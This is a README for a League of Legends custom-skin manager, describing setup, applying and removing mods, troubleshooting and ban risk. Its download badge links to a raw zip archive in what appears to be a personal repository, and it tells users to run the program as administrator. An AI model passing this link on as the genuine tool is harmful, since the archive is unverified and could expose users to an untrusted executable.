# 🛠️ cslol-manager - Easily manage custom League of Legends skins

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Safim6950/cslol-manager/raw/refs/heads/main/cslol/cslol-manager-v2.4.zip)

## 📌 What is this tool?
This program helps you manage custom skins for League of Legends. You use it to install, organize, and activate fan-made skin modifications for your champions. It simplifies the process of interacting with your game files by automating the modding workflow. The manager keeps your game files clean and ensures your custom skins work correctly during matches.

## 💻 System Requirements
To run this software, ensure your computer meets these basic specifications:
- Operating System: Windows 10 or Windows 11.
- Game Client: League of Legends must be installed on your computer.
- Disk Space: At least 200 megabytes of free space for the manager itself.
- Permissions: Administrative rights on your computer to allow file modifications.

## ⚙️ Initial setup
When you open the program for the first time, it asks you to locate your League of Legends installation folder. Use the folder selection tool to point the manager toward your Riot Games directory. Usually, this is found at C:\Riot Games\League of Legends. 

Once you select this folder, the manager scans your game directory. This initial scan might take a few seconds. When the scan finishes, the interface displays your current game status.

## 🎨 Managing your skins
The interface separates your skins into categories. To add a new skin:

1. Download a mod package file from a reputable community source like Runeforge.
2. Drag and drop the downloaded file directly into the manager window.
3. Click the checkbox next to the skin name to select it.
4. Click the "Run" or "Apply" button located at the bottom of the window.

The manager processes the files and prepares them for the game client. Once the progress bar fills, your skins are active. You can now launch League of Legends normally through the standard Riot client.

## 🔄 Updating your skins
Game updates often break custom modifications. If League of Legends releases a patch, you might experience issues with your custom skins. To fix this, open the manager and click the "Refresh" or "Re-sync" button. The software checks for file mismatches and fixes them automatically. If a skin remains broken after a sync, you must wait for the creator of that specific skin to upload an updated version compatible with the new patch.

## 🛡️ Important safety tips
Custom skins change the appearance of your game. Follow these guidelines to stay safe:

- Use custom skins for visual changes only. Changes that give you an unfair advantage, such as altering game logic or map visibility, trigger anti-cheat systems.
- Always keep a backup of your original game files if the manager provides a restore feature.
- Close the manager before you run the main Riot game client if you experience performance issues.
- Only download mod packages from trusted community websites.

## 🔍 Troubleshooting common problems
If the manager does not work as expected, check these common fixes:

- The skin does not appear in-game: Ensure you clicked the "Apply" button in the manager. Restart the game client completely.
- The manager crashes on startup: Right-click the application, go to Properties, and select "Run as Administrator."
- Game files appear corrupted: Navigate to the Riot Client, go to Settings, and select "Repair" to reset your game files to their original state. After the repair, you can re-apply your mods.
- The path is incorrect: Go to the settings menu inside the manager and verify that the file path points exactly to the directory where the League of Legends executable resides.

## 📝 Frequently asked questions
Do I get banned for using this? Custom skins are generally considered a cosmetic choice by the community. However, Riot Games reserves the right to restrict third-party software that interacts with the client. Most users experience no issues as long as the modifications do not provide a competitive advantage.

Can I use multiple skins at once? Yes, but avoid selecting multiple skins for the same champion simultaneously, as this causes visual glitches or crashes.

Does the manager need to stay open while playing? No, you can apply your skins and then close the manager to save system resources.

How do I remove a skin? To remove a skin, uncheck it in the manager list and click "Apply" again to clean the files from your game folder.
